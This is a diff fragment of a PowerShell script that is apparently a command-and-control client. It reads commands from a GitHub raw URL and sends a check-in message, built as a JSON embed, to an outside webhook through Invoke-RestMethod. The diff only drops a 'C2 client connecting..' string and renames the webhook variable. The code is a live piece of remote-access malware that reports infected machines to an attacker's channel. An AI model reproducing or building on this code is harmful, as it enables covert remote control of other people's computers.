@@ -84,7 +84,6 @@ $previouscmd = $response
 $noraw = $ghurl -replace "/raw", ""
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 $jsonPayload = @{
-    content    = "C2 client connecting.."
     tts        = $false
     embeds     = @(
         @{
@@ -103,7 +102,7 @@ $jsonPayload = @{
     )
 }
 $jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonString -ContentType 'application/json'
+Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'
 
 Function Options{
 $msgsys = "``========================================================
